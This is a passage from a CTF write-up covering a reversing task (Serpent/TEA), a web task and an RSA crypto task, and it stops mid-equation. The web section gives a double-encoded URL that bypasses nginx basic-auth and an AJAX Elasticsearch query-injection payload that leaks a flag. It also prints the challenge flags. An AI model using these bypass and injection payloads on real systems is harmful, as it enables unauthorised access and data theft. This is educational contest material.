&#34;0x45DFAE8F&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;0x45DFAE8F&#34; -&gt; &#34;0xCF365A10&#34;

&#34;0x510340B5&#34;[label=&#34;v33[j] = s[4*k+j] ^ message_2[j];\nmessage_2[j] = 0&#34;]
&#34;0x510340B5&#34; -&gt; &#34;0x7E76B88E&#34;

&#34;0x5E778DDD&#34;[label=&#34;i = 0&#34;]
&#34;0x5E778DDD&#34; -&gt; &#34;0x39ABA8E6&#34;

&#34;0x6968BCED&#34;[label=&#34;END&#34;]

&#34;0x7E76B88E&#34;[label=&#34;++j&#34;]
&#34;0x7E76B88E&#34; -&gt; &#34;0xF100B3F1&#34;
}</code></pre>
<h4 id="sub403090"><code>sub_403090</code><a hidden class="anchor" aria-hidden="true" href="#sub403090">#</a></h4>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph {
node [shape=&#34;box&#34;];

&#34;BEGIN&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;BEGIN&#34; -&gt; &#34;0xA9B955DB&#34;

&#34;0x9606678C&#34;[label=&#34;++v31&#34;]
&#34;0x9606678C&#34; -&gt; &#34;0xE95AC0CE&#34;

&#34;0x9AEEB6EF&#34;[label=&#34;++v33&#34;]
&#34;0x9AEEB6EF&#34; -&gt; &#34;0x5D8F0B74&#34;

&#34;0x9D018AD3&#34;[label=&#34;s[v34] = v37[4*v34]&#34;]
&#34;0x9D018AD3&#34; -&gt; &#34;0x2ECFFA35&#34;

&#34;0x9ED567C1&#34;[label=&#34;v30 = 0&#34;]
&#34;0x9ED567C1&#34; -&gt; &#34;0x266844EC&#34;

&#34;0xA9B955DB&#34;[shape=&#34;point&#34;]
&#34;0xA9B955DB&#34; -&gt; &#34;0x2F508473&#34;[label=&#34;!v44&#34;]
&#34;0xA9B955DB&#34; -&gt; &#34;0xC5DE43B8&#34;[style=&#34;dashed&#34;]

&#34;0xAB353F6F&#34;[label=&#34;v37[v35] = v42[v35]&#34;]
&#34;0xAB353F6F&#34; -&gt; &#34;0x68961212&#34;

&#34;0xAC6E0E08&#34;[shape=&#34;point&#34;]
&#34;0xAC6E0E08&#34; -&gt; &#34;0x1CD6C9C1&#34;

&#34;0xB52C03B2&#34;[shape=&#34;point&#34;]
&#34;0xB52C03B2&#34; -&gt; &#34;0x1E2DB7B4&#34;

&#34;0xC04417E3&#34;[label=&#34;++v32&#34;]
&#34;0xC04417E3&#34; -&gt; &#34;0xFBD35FED&#34;

&#34;0xC20FEFFC&#34;[label=&#34;v37[v36] = 1\nv34 = 0&#34;]
&#34;0xC20FEFFC&#34; -&gt; &#34;0x122E3189&#34;

&#34;0xC3734AAC&#34;[shape=&#34;point&#34;]
&#34;0xC3734AAC&#34; -&gt; &#34;0xB52C03B2&#34;

&#34;0xC5DE43B8&#34;[shape=&#34;point&#34;]
&#34;0xC5DE43B8&#34; -&gt; &#34;0xD35B09A7&#34;[label=&#34;v40 &lt; 0x20&#34;]
&#34;0xC5DE43B8&#34; -&gt; &#34;0x2E8B62E9&#34;[style=&#34;dashed&#34;]

&#34;0xC8900AC5&#34;[label=&#34;v29 = (3 - v30) % 32\nv28 = 0\nv27 = 0&#34;]
&#34;0xC8900AC5&#34; -&gt; &#34;0x355CE5DB&#34;

&#34;0xD35B09A7&#34;[label=&#34;memset(v37, 0, 0x20)\nv36 = v40\nv35 = 0&#34;]
&#34;0xD35B09A7&#34; -&gt; &#34;0x7AFA98D4&#34;

&#34;0xD5C4F2A6&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;0xD5C4F2A6&#34; -&gt; &#34;0x9606678C&#34;

&#34;0xDCDB893A&#34;[shape=&#34;point&#34;]
&#34;0xDCDB893A&#34; -&gt; &#34;0x1E2DB7B4&#34;

&#34;0xE07F4AFD&#34;[label=&#34;v33 = 0&#34;]
&#34;0xE07F4AFD&#34; -&gt; &#34;0x5D8F0B74&#34;

&#34;0xE1928E6D&#34;[label=&#34;v24 = ((v28 &gt;&gt; v26) &amp; 1) &lt;&lt; v27\nv43[4 * v30 + v26] = v43[4 * v30 + v26] | v24;&#34;]
&#34;0xE1928E6D&#34; -&gt; &#34;0xEDCFB4AF&#34;

&#34;0xE95AC0CE&#34;[shape=&#34;point&#34;]
&#34;0xE95AC0CE&#34; -&gt; &#34;0xD5C4F2A6&#34;[label=&#34;v31 &lt; 140&#34;]
&#34;0xE95AC0CE&#34; -&gt; &#34;0x9ED567C1&#34;[style=&#34;dashed&#34;]

&#34;0xEDCFB4AF&#34;[label=&#34;++v26&#34;]
&#34;0xEDCFB4AF&#34; -&gt; &#34;0x67B26225&#34;

&#34;0xFBD35FED&#34;[shape=&#34;point&#34;]
&#34;0xFBD35FED&#34; -&gt; &#34;0x4F5A98FA&#34;[label=&#34;v32 &lt; 8&#34;]
&#34;0xFBD35FED&#34; -&gt; &#34;0x521305BC&#34;[style=&#34;dashed&#34;]

&#34;0x122E3189&#34;[shape=&#34;point&#34;]
&#34;0x122E3189&#34; -&gt; &#34;0x9D018AD3&#34;[label=&#34;v34 &lt; 8&#34;]
&#34;0x122E3189&#34; -&gt; &#34;0xDCDB893A&#34;[style=&#34;dashed&#34;]

&#34;0x1CD6C9C1&#34;[label=&#34;++v27&#34;]
&#34;0x1CD6C9C1&#34; -&gt; &#34;0x355CE5DB&#34;

&#34;0x1E2DB7B4&#34;[label=&#34;v32 = 0&#34;]
&#34;0x1E2DB7B4&#34; -&gt; &#34;0xFBD35FED&#34;

&#34;0x266844EC&#34;[shape=&#34;point&#34;]
&#34;0x266844EC&#34; -&gt; &#34;0xC8900AC5&#34;[label=&#34;v30 &lt; 33&#34;]
&#34;0x266844EC&#34; -&gt; &#34;0x775D4F05&#34;[style=&#34;dashed&#34;]

&#34;0x2DC162EB&#34;[shape=&#34;point&#34;]
&#34;0x2DC162EB&#34; -&gt; &#34;0x7E2E7A9E&#34;

&#34;0x2E8B62E9&#34;[shape=&#34;point&#34;]
&#34;0x2E8B62E9&#34; -&gt; &#34;0xE07F4AFD&#34;[label=&#34;v40 == 32&#34;]
&#34;0x2E8B62E9&#34; -&gt; &#34;0x39486DAD&#34;[style=&#34;dashed&#34;]

&#34;0x2ECFFA35&#34;[label=&#34;++v34&#34;]
&#34;0x2ECFFA35&#34; -&gt; &#34;0x122E3189&#34;

&#34;0x2F508473&#34;[label=&#34;EXIT(1)&#34;]

&#34;0x355CE5DB&#34;[shape=&#34;point&#34;]
&#34;0x355CE5DB&#34; -&gt; &#34;0x718C2A8A&#34;[label=&#34;v27 &lt; 32&#34;]
&#34;0x355CE5DB&#34; -&gt; &#34;0x2DC162EB&#34;[style=&#34;dashed&#34;]

&#34;0x39486DAD&#34;[label=&#34;EXIT(1)&#34;]

&#34;0x4F5A98FA&#34;[label=&#34;v38[v32] = s[v32]&#34;]
&#34;0x4F5A98FA&#34; -&gt; &#34;0xC04417E3&#34;

&#34;0x521305BC&#34;[label=&#34;v31 = 8&#34;]
&#34;0x521305BC&#34; -&gt; &#34;0xE95AC0CE&#34;

&#34;0x5D8F0B74&#34;[shape=&#34;point&#34;]
&#34;0x5D8F0B74&#34; -&gt; &#34;0x7EE39471&#34;[label=&#34;v33 &lt; 8&#34;]
&#34;0x5D8F0B74&#34; -&gt; &#34;0xC3734AAC&#34;[style=&#34;dashed&#34;]

&#34;0x67B26225&#34;[shape=&#34;point&#34;]
&#34;0x67B26225&#34; -&gt; &#34;0xE1928E6D&#34;[label=&#34;v26 &lt; 4&#34;]
&#34;0x67B26225&#34; -&gt; &#34;0xAC6E0E08&#34;[style=&#34;dashed&#34;]

&#34;0x68961212&#34;[label=&#34;++v35&#34;]
&#34;0x68961212&#34; -&gt; &#34;0x7AFA98D4&#34;

&#34;0x718C2A8A&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;0x718C2A8A&#34; -&gt; &#34;0x67B26225&#34;

&#34;0x775D4F05&#34;[label=&#34;END&#34;]

&#34;0x7AFA98D4&#34;[shape=&#34;point&#34;]
&#34;0x7AFA98D4&#34; -&gt; &#34;0xAB353F6F&#34;[label=&#34;v35 &lt; v36&#34;]
&#34;0x7AFA98D4&#34; -&gt; &#34;0xC20FEFFC&#34;[style=&#34;dashed&#34;]

&#34;0x7E2E7A9E&#34;[label=&#34;++v30&#34;]
&#34;0x7E2E7A9E&#34; -&gt; &#34;0x266844EC&#34;

&#34;0x7EE39471&#34;[label=&#34;s[v33] = v42[4 * v33]&#34;]
&#34;0x7EE39471&#34; -&gt; &#34;0x9AEEB6EF&#34;
}</code></pre>
<h4 id="sub4008f0"><code>sub_4008F0</code><a hidden class="anchor" aria-hidden="true" href="#sub4008f0">#</a></h4>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph {
node [shape=&#34;box&#34;];

&#34;BEGIN&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;BEGIN&#34; -&gt; &#34;0xB8C6BEDB&#34;

&#34;0xB8C6BEDB&#34;[label=&#34;i2 = i\ni = i - 1&#34;]
&#34;0xB8C6BEDB&#34; -&gt; &#34;0xDB5D7A76&#34;[label=&#34;i2&#34;]
&#34;0xB8C6BEDB&#34; -&gt; &#34;0xB43E0C74&#34;[style=&#34;dashed&#34;]

&#34;0xDB5D7A76&#34;[fillcolor=&#34;lightblue&#34;, style=&#34;filled&#34;]
&#34;0xDB5D7A76&#34; -&gt; &#34;0xB8C6BEDB&#34;

&#34;0xB43E0C74&#34;[label=&#34;END&#34;]
}</code></pre>
<div class="alert warning">
  <em>cdemirer</em> wrote a deobfuscator which made the script very readable. If you are interested on the deobfuscator, let&rsquo;s wait if he is gonna write something about it.
</div>
  

<h3 id="part-ii-looking-for-the-algorithms">Part II. Looking for the Algorithms<a hidden class="anchor" aria-hidden="true" href="#part-ii-looking-for-the-algorithms">#</a></h3>

<p>By searching the constant available in <code>sub_4008F0</code> (i.e., <code>0x61C88647</code>), we found signs of <em>Tiny Encryption Algorithm</em> (TEA)<sup class="footnote-ref" id="fnref:tea-signs"><a class="footnote" href="#fn:tea-signs">3</a></sup>. By comparing to its implementation from Wikipedia<sup class="footnote-ref" id="fnref:tea-wiki"><a class="footnote" href="#fn:tea-wiki">4</a></sup>, we are convinced that <code>sub_4008F0</code> is an encryptor of TEA.</p>

<p>On the other hand, <code>sub_403EC0</code> is less trivial. It called <code>sub_403090</code> once before the <em>encryption</em> is done - which I think is a key expansion algorithm. Eventually, I observed that <code>dword_6060D0</code> is used in both of the functions above. I copied the first 16 bytes of it and searched on Google:</p>

<p><figure><img src="/images/2021-05-22-3kctf/layer-googling.png" alt=""></figure></p>

<p>The subsequent bytes for <code>dword_6060D0</code> match the S-boxes for Serpent. After all, the functions are implementing Serpent cipher. It is a lesser-known encryption algorithm - which is actually a candidate of AES. Up to now, I suspect that 0x606090 is the target ciphertext which is the encrypted flag. The key is derived by the sum of ascii values of the flag, which could be exhausted.</p>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph {
rankdir=LR
node [shape=&#34;box&#34;]

flag-&gt;x1[label=&#34;Serpent&#34;]
x1-&gt;&#34;bytes_606090&#34;[label=&#34;TEA&#34;]

x1[shape=&#34;point&#34;]
}</code></pre>
<p>Unfortunately, we are unable to recover the flag. Unknowningly what happened, I decided to sleep.</p>

<p>While I am asleep, <em>harrier</em> has notified us that the binary for the challenge is updated. There are one solve immediately after. This got me thinking: What I had is correct, but the ciphertext given from the previous binary is wrong. Hence, I updated my script with the new ciphertext and execute again - and I am able to get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">flag{_a1f040be800d4dd9a2b9a7d2b8f2be31_}</code></pre></div>
<h2 id="pawnshop-web-478-points">p(a)wnshop (Web; 478 points)<a hidden class="anchor" aria-hidden="true" href="#pawnshop-web-478-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<p>The first goal of this challenge is to access the admin backend service with this nginx configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nginx" data-lang="nginx"><span style="color:#66d9ef">location</span> ~<span style="color:#e6db74">admin</span> {
    <span style="color:#f92672">auth_basic</span> <span style="color:#e6db74">&#34;pawnshop</span> <span style="color:#e6db74">admin&#34;</span>;
    <span style="color:#f92672">auth_basic_user_file</span> <span style="color:#e6db74">/etc/nginx/.htpasswd</span>;
}

<span style="color:#66d9ef">location</span> ~<span style="color:#e6db74">^/backend/(.*)$</span> {
    <span style="color:#f92672">proxy_pass</span>         <span style="color:#e6db74">http://172.30.0.6:8080/</span>$1;
    <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Host</span> $http_host;
    <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Real-IP</span> $remote_addr;
    <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-For</span> $proxy_add_x_forwarded_for;
    <span style="color:#f92672">proxy_http_version</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
    <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Upgrade</span> $http_upgrade;
    <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Connection</span> $http_connection;
}</code></pre></div>
<p>The challenge states that we should not brute force <code>.htpasswd</code>. So accessing <code>/backend/admin.py</code> with a valid password seems impossible. But luckily we can bypass the restriction with double-encoding: <code>/backend/%2561dmin.py</code></p>

<p>Then we need to inject the Elasticsearch query:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#e6db74">&#39;query_string&#39;</span>: {
        <span style="color:#e6db74">&#39;query&#39;</span>: <span style="color:#e6db74">&#39;id:&gt;0 AND seller:&#34;&#39;</span><span style="color:#f92672">+</span>emailAddr<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;&#39;</span>,
        <span style="color:#e6db74">&#34;default_field&#34;</span>:<span style="color:#e6db74">&#34;seller&#34;</span>
    }</code></pre></div>
<p>where the email address is validated:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> email.utils <span style="color:#f92672">import</span> parseaddr
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_email</span>(mail):
	parsedEmail <span style="color:#f92672">=</span> parseaddr(mail)[<span style="color:#ae81ff">1</span>]
	<span style="color:#66d9ef">if</span> parsedEmail <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> parsedEmail <span style="color:#f92672">!=</span> mail <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;.+@.+\..+&#39;</span>,parsedEmail):
		api({<span style="color:#e6db74">&#39;msg&#39;</span>:<span style="color:#e6db74">&#39;invalid email&#39;</span>})</code></pre></div>
<p>So the standard way to fulfill the validation while injecting the query is to use a pair of quote in the email name. To make a query we can reuse the UI provided:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">x</span>(<span style="color:#a6e22e">q</span>){
    <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
        <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/backend/%2561dmin.py&#39;</span>, 
        <span style="color:#a6e22e">type</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>, 
        <span style="color:#a6e22e">data</span> <span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;action&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;lookup&#34;</span>,<span style="color:#e6db74">&#34;mail&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;&#34; AND value:*&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">q</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;* AND seller:&#34;jmfffc@pawnshop.2021.3k.ctf.to&#39;</span>},
        <span style="color:#a6e22e">success</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">result</span>) {
          <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">msg</span>);
        }
    })
}</code></pre></div>
<p>Note that <code>jmfffc@pawnshop.2021.3k.ctf.to</code> is the email address of the flag seller. Originally I use both upper case and lower case characters (and also some special characters like the underscore) in the query but I found that the query is case insensitive, so I remove the upper case characters later on. Then I got the possible bigrams of the flag:</p>
<pre tabindex="0"><code>bigram = [&#39;0u&#39;,&#39;1d&#39;,&#39;2_&#39;,&#39;3k&#39;,&#39;41&#39;,&#39;il&#39;,&#39;ti&#39;,&#39;uh&#39;,&#39;ma&#39;,&#39;hu&#39;,&#39;em&#39;,&#39;p2&#39;,&#39;tt&#39;,&#39;io&#39;,&#39;da&#39;,&#39;_v&#39;,&#39;4n&#39;,&#39;nd&#39;,&#39;al&#39;,&#39;on&#39;,&#39;va&#39;,&#39;u_&#39;,&#39;ai&#39;,&#39;at&#39;,&#39;l_&#39;,&#39;s4&#39;,&#39;_s&#39;,&#39;_4&#39;,&#39;_e&#39;,&#39;n_&#39;,&#39;tp&#39;,&#39;_h&#39;,&#39;ht&#39;,&#39;_y&#39;,&#39;y0&#39;,&#39;l1&#39;,&#39;d_&#39;];</code></pre>
<p>We have <code>3k</code> in the bigram list as expected. Our teammate <em>Mystiz</em> created a bigram graph for himself (not me, I don't know how to read the graph effectively):</p>
<pre tabindex="0"><code class="language-viz-dot" data-lang="viz-dot">digraph{
&#34;0&#34; -&gt; &#34;u&#34;
&#34;1&#34; -&gt; &#34;d&#34;
&#34;2&#34; -&gt; &#34;_&#34;
&#34;3&#34; -&gt; &#34;k&#34;
&#34;4&#34; -&gt; &#34;1&#34;
&#34;i&#34; -&gt; &#34;l&#34;
&#34;t&#34; -&gt; &#34;i&#34;
&#34;u&#34; -&gt; &#34;h&#34;
&#34;m&#34; -&gt; &#34;a&#34;
&#34;h&#34; -&gt; &#34;u&#34;
&#34;e&#34; -&gt; &#34;m&#34;
&#34;p&#34; -&gt; &#34;2&#34;
&#34;t&#34; -&gt; &#34;t&#34;
&#34;i&#34; -&gt; &#34;o&#34;
&#34;d&#34; -&gt; &#34;a&#34;
&#34;_&#34; -&gt; &#34;v&#34;
&#34;4&#34; -&gt; &#34;n&#34;
&#34;n&#34; -&gt; &#34;d&#34;
&#34;a&#34; -&gt; &#34;l&#34;
&#34;o&#34; -&gt; &#34;n&#34;
&#34;v&#34; -&gt; &#34;a&#34;
&#34;u&#34; -&gt; &#34;_&#34;
&#34;a&#34; -&gt; &#34;i&#34;
&#34;a&#34; -&gt; &#34;t&#34;
&#34;l&#34; -&gt; &#34;_&#34;
&#34;s&#34; -&gt; &#34;4&#34;
&#34;_&#34; -&gt; &#34;s&#34;
&#34;_&#34; -&gt; &#34;4&#34;
&#34;_&#34; -&gt; &#34;e&#34;
&#34;n&#34; -&gt; &#34;_&#34;
&#34;t&#34; -&gt; &#34;p&#34;
&#34;_&#34; -&gt; &#34;h&#34;
&#34;h&#34; -&gt; &#34;t&#34;
&#34;_&#34; -&gt; &#34;y&#34;
&#34;y&#34; -&gt; &#34;0&#34;
&#34;l&#34; -&gt; &#34;1&#34;
&#34;d&#34; -&gt; &#34;_&#34;
}</code></pre>
<p>Then he started fine-tuning the flag... <code>_email</code>,<code>y0u</code>,<code>val1d</code>,<code>http2</code>,<code>val1dation</code>,<code>s41d</code></p>

<p><figure><img src="/images/2021-05-22-3kctf/pawnshop-1.png" alt=""></figure></p>

<p>I forgot to tell him I found the keyword <code>huh</code> before, huh. But he found that immediately afterwards. I build a trigram later on, but Mystiz did not need this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">trigram = [&#39;1da&#39;,&#39;1d_&#39;,&#39;2_4&#39;,&#39;0u_&#39;,&#39;41d&#39;,&#39;tp2&#39;,&#39;dat&#39;,&#39;htt&#39;,&#39;d_h&#39;,&#39;_4n&#39;,&#39;on_&#39;,&#39;val&#39;,&#39;nd_&#39;,&#39;y0u&#39;,&#39;al1&#39;,&#39;mai&#39;,&#39;u_s&#39;,&#39;ttp&#39;,&#39;ail&#39;,&#39;_y0&#39;,&#39;huh&#39;,&#39;s41&#39;,&#39;tio&#39;,&#39;ati&#39;,&#39;ion&#39;,&#39;_hu&#39;,&#39;_va&#39;,&#39;n_y&#39;,&#39;l_v&#39;,&#39;il_&#39;,&#39;ema&#39;,&#39;l1d&#39;,&#39;_s4&#39;,&#39;d_e&#39;,&#39;_em&#39;,&#39;4nd&#39;,&#39;p2_&#39;];</code></pre></div>
<p><figure><img src="/images/2021-05-22-3kctf/pawnshop-2.png" alt=""></figure></p>

<p>Then he submitted the flag before I got the flag: <code>3k{http2_4nd_email_val1dation_y0u_s41d_huh}</code>.</p>

<p>By the way, the intended solution was to use h2c request smuggling instead of double encoding to bypass the proxy checking.</p>

<h2 id="asr-crypto-483-points">ASR (Crypto; 483 points)<a hidden class="anchor" aria-hidden="true" href="#asr-crypto-483-points">#</a></h2>

<p>Solved by <em>TWY</em>.</p>

<h3 id="part-i-basic-knowledge">Part I. Basic Knowledge<a hidden class="anchor" aria-hidden="true" href="#part-i-basic-knowledge">#</a></h3>

<p>Fermat Little Theorem: $a^p\equiv a \pmod p$ for all prime number $p$'s, or equivalently,</p>

<p><span  class="math">\[
a^{p-1} \equiv \left\{
\begin{array}{ll}
0 & a \bmod p \equiv 0\\
1 & \text{otherwise}
\end{array}
\right.
\pmod p\]</span></p>

<p>for all prime number $p$'s.</p>

<h3 id="part-ii-analysis">Part II. Analysis<a hidden class="anchor" aria-hidden="true" href="#part-ii-analysis">#</a></h3>

<p>The program uses <code>OpenSSL.crypto</code> as the RSA private key loading library.</p>

<p>Given $m$ and $c$, the final target of the challenge is to generate a private key such that $m^d \bmod N = c$.</p>

<p>with the constraints</p>

<ul>
<li>$d &gt; 1337^5$ (<code>i dont like small numbers</code>)</li>
<li>$N \bmod 2 \neq 0$ (<code>and i dont like even numbers</code>).</li>
</ul>

<p>The beginning of the source code checks whether the following key is valid:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">-----BEGIN RSA PRIVATE KEY-----
MBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA=
-----END RSA PRIVATE KEY-----</code></pre></div>
<p>The key reads as the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">version          = 0x00 (0)
modulus          = 0x2d (45)
public exponent  = 0x07 (7)
private exponent = 0x00 (0)
prime1           = 0x0f (15)
prime2           = 0x03 (3)
exponent1        = 0x00 (0)
exponent2        = 0x00 (0)
coefficient      = 0x00 (0)</code></pre></div>
<p>Apparently 15 is neither a prime nor coprime with 3, and all parameters involving modular inverse calculations are set to 0. So this should be an invalid key.</p>

<p>However, earlier versions do not recognize this invalid key pattern, so it may pass the check.</p>

<p>Hence this check in the source code is used tell us that the challenge server is not using the older version that allows such kind of invalid keys.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> OpenSSL.crypto <span style="color:#66d9ef">as</span> crypto

rsa_p_not_prime_pem <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----BEGIN RSA PRIVATE KEY-----</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">MBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA=</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----END RSA PRIVATE KEY-----</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
invalid_key <span style="color:#f92672">=</span> crypto<span style="color:#f92672">.</span>load_privatekey(crypto<span style="color:#f92672">.</span>FILETYPE_PEM, rsa_p_not_prime_pem)
error_msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Pycrypto needs to be patched!&#34;</span>

<span style="color:#66d9ef">try</span>:
    invalid_key<span style="color:#f92672">.</span>check()
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">RuntimeError</span>(error_msg)
<span style="color:#66d9ef">except</span> crypto<span style="color:#f92672">.</span>Error:
    <span style="color:#66d9ef">pass</span></code></pre></div>
<p>Obviously this is not <code>pycrypto</code> but <code>OpenSSL.crypto</code> library.</p>

<p>The expected error message (if printed out) is (realigned):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">OpenSSL.crypto.Error: [
    (
        &#39;rsa routines&#39;,
        &#39;RSA_check_key_ex&#39;,
        &#39;p not prime&#39;
    ),(
        &#39;rsa routines&#39;,
        &#39;RSA_check_key_ex&#39;,
        &#39;d e not congruent to 1&#39;
    ),(
        &#39;bignum routines&#39;,
        &#39;BN_mod_inverse&#39;,
        &#39;no inverse&#39;
    )
]</code></pre></div>
<p>Since the error list is actually quite comprehensive, which means we had better use a valid RSA key with two primes.</p>

<h3 id="part-iii-making-use-of-the-theorems">Part III. Making Use of the Theorem(s)<a hidden class="anchor" aria-hidden="true" href="#part-iii-making-use-of-the-theorems">#</a></h3>

<p>Since we know that $a^{p-1} \equiv 1 \pmod p$ for all $a$'s such that $0 \lt a \lt p$, we can conclude that $a^x - a^{x \bmod{(p-1)}} \equiv 0 \pmod p$ for all possible $a$'s for all non-negative integer $x$'s.</p>

<p>To fulfill the modular equation in the challenge, the modulus $N$ needs to be larger than $c$, which means we need to have primes $p$ and $q$ such that $pq &gt; c$.</p>

<p>Instead of finding $N$ directly, we can make use of the Chinese remainder theorem to construct the values of $N$, $d$, and $e$ if we can obtain two equations like this:</p>

<p><span  class="math">\[
\left\{
\begin{array}{ll}
m^{x_p} \equiv c \pmod p \\
m^{x_q} \equiv c \pmod q
\end{array}
\right.
\]</span></p>

<p>Then we have</p>

<p><span  class="math">\[
\left\{
\begin{array}{ll}
d \bmod{(p-1)} \equiv x_p \\
d \bmod{(q-1)} \equiv x_q
\end{array}
\right.
\]</span></p>

<p>Notice that for odd prime $p$ and $q$, both $p-1$ and $q-1$ are even, which means $\phi(N)$ (Euler's totient function) must be even. Therefore, in <em>most cases</em> $d$ has to be odd so that $e$ can be obtained, i.e. $d$ is <strong>invertible</strong> under modulo $\phi(N)$. <em>(Since the value of $\lambda(N)$ (Carmichael function / Reduced totient function) is always even except that $\lambda(1) = \lambda(2) = 1$, no such exception exists)</em></p>

<p>This means for example there is no use finding an <strong>even</strong> $x_p = p - 1$ where $p$ is $260163...128287$ (a 183-digit prime factor of $c-1$<sup class="footnote-ref" id="fnref:factordb-1"><a class="footnote" href="#fn:factordb-1">5</a></sup>), so $m^{p-1}\equiv 1 \equiv c \pmod p$.</p>

<p>To generalize, we only need $x_p = p - 1 + b$, where $p$ is a prime factor of $c - m^b$ for <strong>odd</strong> $b$. Here $m^{x_p} \equiv m^{p-1+b}\equiv m^b \equiv c \pmod p$.</p>

<p>With the help of Alpertron<sup class="footnote-ref" id="fnref:alpertron"><a class="footnote" href="#fn:alpertron">6</a></sup>, we obtained the largest factor of $c-m^7$, which is $r_1 := 795088...535639$ (185 digits)<sup class="footnote-ref" id="fnref:factordb-2"><a class="footnote" href="#fn:factordb-2">7</a></sup> and the largest factor of $c-m^{11}$, which is $r_2 := 140515...084809$ (190 digits)<sup class="footnote-ref" id="fnref:factordb-3"><a class="footnote" href="#fn:factordb-3">8</a></sup>.</p>

<p>However, these two factors do not work, why?</p>

<p>The reason is that $\text{GCD}(p-1, q-1)=42$, and $7 \not\equiv 11 \pmod{42}$.</p>

<p>Therefore, we continued and went into a long way of dealing with the factorization of much larger numbers (Since $m^{12}\gt c$, $m^b$ becomes exponentially greater than $c$ for $b \geq 12$), and found the largest prime factor of $-(c-m^{27})$, which is $r_3 := 156985...742221$ (<strong>468</strong> digits!!!)<sup class="footnote-ref" id="fnref:factordb-4"><a class="footnote" href="#fn:factordb-4">9</a></sup></p>

<div class="alert info">
  <strong>Note:</strong> Since RSA Private Key requires two primes, so we cannot just use this alone although this already far exceeds $c$
</div>
  

<p>Now let's try to find the GCD again.</p>

<ol>
<li>$\text{GCD}(r_1-1, r_2-1)=42$</li>
<li>$\text{GCD}(r_1-1, r_3-1)=2$</li>
<li>$\text{GCD}(r_2-1, r_3-1)=4$</li>
</ol>

<p>Since $7\equiv11\equiv27\pmod 4$, so using either of them along with the new prime factor is fine. (Really?)</p>

<p>In this case, we have chosen $r_2$.</p>

<div class="alert warning">
  Actually the pair using $r_1$ does not work (to be explained later).
</div>
  

<p>Since these two numbers are not coprime, we actually have to set up three equations for the CRT.</p>

<p><span  class="math">\[
\left\{
